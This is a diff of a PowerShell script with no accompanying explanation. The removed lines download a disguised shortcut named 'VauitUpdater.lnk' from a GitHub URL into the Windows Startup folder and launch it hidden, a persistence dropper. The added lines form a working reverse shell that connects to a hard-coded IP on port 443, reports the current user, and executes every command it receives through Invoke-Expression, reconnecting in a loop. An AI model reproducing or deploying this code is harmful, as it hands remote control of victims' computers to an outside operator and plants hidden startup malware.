@@ -1,12 +1,40 @@
-$url = "https://raw.githubusercontent.com/n7-1/5/refs/heads/main/VauitUpdater.lnk"
-cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
-$destPath = ".\VauitUpdater.lnk"
-try {
-    if (-not (Test-Path $destPath)) {
-        # Используем -ErrorAction Stop, чтобы поймать ошибку в блоке catch
-        Invoke-WebRequest -Uri $url -OutFile $destPath -ErrorAction Stop
+$ip = "176.122.27.51"
+$port = 443
+$retryDelay = 10
+while ($true) {
+    try {
+        Write-Host "Connecting to $ip`:$port..." -ForegroundColor Cyan
+        $t = New-Object System.Net.Sockets.TCPClient($ip, $port)
+        $s = $t.GetStream()
+        $r = New-Object System.IO.StreamReader($s)
+        $w = New-Object System.IO.StreamWriter($s)
+        $w.AutoFlush = $true
+
+        Write-Host "Connected!" -ForegroundColor Green
+        $w.WriteLine("--- Connected: $(whoami) ---")
+
+        while($t.Connected) {
+            $w.Write("PS > ")
+            $c = $r.ReadLine()
+
+            if ($null -eq $c) { break }
+            if ([string]::IsNullOrWhiteSpace($c)) { continue }
+
+            try {
+                $out = Invoke-Expression $c 2>&1 | Out-String
+                if ($out) { $w.WriteLine($out) } else { $w.WriteLine(" ") }
+            } catch {
+                $w.WriteLine("Error: " + $_.Exception.Message)
+            }
+        }
+    } catch {
+        Write-Host "Connection Error: $($_.Exception.Message)" -ForegroundColor Yellow
     }
-} catch {
-    Write-Host "Download Error: $($_.Exception.Message)" -ForegroundColor Yellow
+    if ($r) { $r.Close() }
+    if ($w) { $w.Close() }
+    if ($s) { $s.Close() }
+    if ($t) { $t.Close() }
+
+    Write-Host "Retrying in $retryDelay sec..." -ForegroundColor Cyan
+    Start-Sleep -Seconds $retryDelay
 }
-Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\VauitUpdater.lnk" -WindowStyle Hidden
